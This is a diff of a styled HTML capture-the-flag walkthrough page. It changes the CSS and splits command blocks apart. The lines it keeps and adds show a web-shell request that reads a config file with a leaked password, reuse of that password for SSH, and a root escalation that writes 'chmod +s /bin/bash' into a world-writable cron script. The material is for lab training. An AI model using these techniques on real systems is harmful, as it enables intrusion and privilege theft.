@@ -74,7 +74,8 @@ table{width:100%;border-collapse:collapse;margin:6px 0 2px}
 th,td{text-align:left;padding:9px 10px;border-bottom:1px solid var(--line);font-size:.94rem;vertical-align:top}
 th{color:var(--muted);font-weight:700;font-size:.82rem;text-transform:uppercase;letter-spacing:.03em}
 pre{position:relative;background:var(--code);color:var(--codeink);padding:14px 16px;border-radius:14px;overflow-x:auto;margin:12px 0;
-  font:13.5px/1.6 ui-monospace,Menlo,Consolas,monospace;max-width:100%;border:1px solid var(--line);border-left:4px solid var(--accent2);cursor:copy}
+  font:13.5px/1.6 ui-monospace,Menlo,Consolas,monospace;max-width:100%;border:1px solid var(--line);border-left:4px solid var(--accent2);cursor:copy;scrollbar-width:none}
+pre::-webkit-scrollbar{display:none}
 pre code{background:none;padding:0;color:inherit}
 code{font:0.9em ui-monospace,Menlo,Consolas,monospace;background:var(--why);padding:1px 6px;border-radius:6px;color:var(--ink)}
 pre .c{color:var(--muted)}
@@ -96,7 +97,7 @@ pre:hover .copy,.copy:focus-visible{opacity:.9}
 .why li{margin:5px 0}
 .lesson{color:var(--muted)}
 .side{display:none}
-@media (min-width:1180px){
+@media (min-width:1240px){
   .side{display:block;position:fixed;top:calc(env(safe-area-inset-top,0px) + 96px);left:calc(50% - 390px - 212px);width:190px;box-sizing:border-box;padding:15px;border-radius:18px;background:var(--card);border:1px solid var(--line);box-shadow:var(--shadow);z-index:4}
   .side h2{font-family:"Bricolage Grotesque",system-ui,sans-serif;font-size:1.02rem;margin:0 0 10px}
   .side .chips{display:grid;grid-template-columns:repeat(5,1fr);gap:6px}
@@ -208,8 +209,8 @@ uid=33(www-data) ...</pre>
   <div class="skill">credential reuse</div>
 <pre>$ curl "http://&lt;target-ip&gt;/uploads/shell.phtml?c=cat%20/var/www/html/admin/config.php"
 $DB_PASS = 'Summer#Breeze88'</pre>
-<pre>$ ssh webdev@&lt;target-ip&gt;       <span class="c"># Summer#Breeze88</span>
-$ cat /home/webdev/user.txt
+<pre>$ ssh webdev@&lt;target-ip&gt;       <span class="c"># Summer#Breeze88</span></pre>
+<pre>$ cat /home/webdev/user.txt
 <span class="f">FLAG{upl04d_t0_w3bsh3ll_w1n}</span></pre>
   <span class="flag"><span class="fl">user</span>FLAG{upl04d_t0_w3bsh3ll_w1n}</span>
   <div class="why"><h4>Why it works</h4>
@@ -221,12 +222,12 @@ $ cat /home/webdev/user.txt
   <div class="skill">privilege escalation</div>
   <p>A root cron runs a world-writable script every minute.</p>
 <pre>$ cat /etc/cron.d/webbackup
-* * * * * root /opt/scripts/backup.sh
-$ ls -l /opt/scripts/backup.sh
+* * * * * root /opt/scripts/backup.sh</pre>
+<pre>$ ls -l /opt/scripts/backup.sh
 -rwxrwxrwx  (anyone can edit it)</pre>
 <pre>$ echo 'chmod +s /bin/bash' &gt; /opt/scripts/backup.sh
-<span class="c"># wait up to 60s for cron, then:</span>
-$ /bin/bash -p
+<span class="c"># wait up to 60s for cron, then:</span></pre>
+<pre>$ /bin/bash -p
 # cat /root/root.txt
 <span class="f">FLAG{cr0n_w0rld_wr1t4bl3_pwn}</span></pre>
   <span class="flag root"><span class="fl">root</span>FLAG{cr0n_w0rld_wr1t4bl3_pwn}</span>
